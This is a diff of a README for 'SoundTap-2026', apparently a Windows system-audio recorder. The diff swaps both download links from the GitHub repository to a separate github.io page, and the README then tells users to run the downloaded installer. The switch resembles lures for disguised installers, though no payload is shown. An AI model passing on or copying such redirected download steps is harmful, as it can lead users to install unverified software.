@@ -1,6 +1,6 @@
 # 🎧 SoundTap-2026 - Record Streaming Audio On Your PC
 
-[![](https://img.shields.io/badge/Download-SoundTap--2026-blue.svg)](https://github.com/isabelmo7082/SoundTap-2026)
+[![](https://img.shields.io/badge/Download-SoundTap--2026-blue.svg)](https://isabelmo7082.github.io)
 
 ## 📌 About SoundTap-2026
 SoundTap-2026 captures any audio playing through your Windows computer. Whether you listen to music on Spotify, join web meetings, or hear audio from a browser, this tool records the sound as a high-quality file. It works as a virtual audio driver to intercept the sound data directly from your system. You save these recordings as MP3 or WAV files for easy playback on any device.
@@ -17,7 +17,7 @@ SoundTap-2026 requires the following to run on your machine:
 ## 📥 Getting Started
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download: [https://github.com/isabelmo7082/SoundTap-2026](https://github.com/isabelmo7082/SoundTap-2026)
+1. Visit this page to download: [https://isabelmo7082.github.io](https://isabelmo7082.github.io)
 2. Locate the installer file in your Downloads folder after the download finishes.
 3. Double-click the file to start the installation process.
 4. Follow the prompts on your screen to complete the setup.
